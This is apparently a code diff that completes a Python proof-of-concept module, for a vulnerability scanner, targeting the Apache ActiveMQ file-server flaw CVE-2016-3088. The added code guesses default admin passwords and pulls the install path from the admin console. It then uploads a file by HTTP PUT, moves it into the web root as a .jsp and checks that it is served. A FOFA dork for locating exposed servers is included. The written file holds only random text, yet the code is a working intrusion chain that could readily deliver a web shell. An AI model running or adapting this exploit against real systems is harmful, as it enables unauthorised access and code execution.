@@ -1,6 +1,6 @@
 # coding:utf-8  
-import requests
-from lib.core.common import url_handle,get_random_ua
+import requests,re
+from lib.core.common import url_handle,get_random_ua,Str2Base64,random_str
 from lib.core.poc import POCBase
 # ...
 import urllib3
@@ -14,7 +14,7 @@ class POC(POCBase):
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-        略  
+            略  
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "Apache ActiveMQ 远程代码执行漏洞(CVE-2016-3088)",                        # 漏洞名称
@@ -27,7 +27,7 @@ class POC(POCBase):
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-        
+            app="APACHE-ActiveMQ"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -42,23 +42,39 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "" # url自己按需调整
-        
+        if self.port == None:
+            self.target += ":8161"
 
+        url = self.target + "/admin/test/systemProperties.jsp" # url自己按需调整
+        
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
-                    # "Content-Type": "application/x-www-form-urlencoded",
-                    }
+                            }
+        filename = random_str()
+        filecontent = random_str()
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "自己调整":#req.status_code == 200 and :
-                vuln = [True,req.text]
-            else:
-                vuln = [False,req.text]
+            for i in ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]:
+
+                headers["Authorization"] = "Basic " + Str2Base64(i)
+
+                req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+                if req.status_code == 200:
+                    path = re.findall('<td class="label">activemq.home</td>.*?<td>(.*?)</td>', req.text, re.S)[0]
+                    break
+                
+            req0 = requests.put(self.target+"/fileserver/" + filename + ".txt",data=filecontent,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            if req0.status_code == 204:
+                headers["Destination"] = "file://" + path + "/webapps/api/" + filename + ".jsp"
+                move_req = requests.request("MOVE",self.target + "/fileserver/" + filename + ".txt",headers=headers,timeout=self.timeout,verify=False,proxies=self.proxy)
+                
+                del headers["Destination"]
+                req2 = requests.get(self.target + "/api/" + filename + ".jsp",headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+                if filecontent in req2.text:
+                    vuln = [True,"<title>ActiveMQ账号密码：" + i + "  文件地址：" + self.target + "/api/" + filename + ".jsp" + "</title>"]
         except Exception as e:
             raise e
         
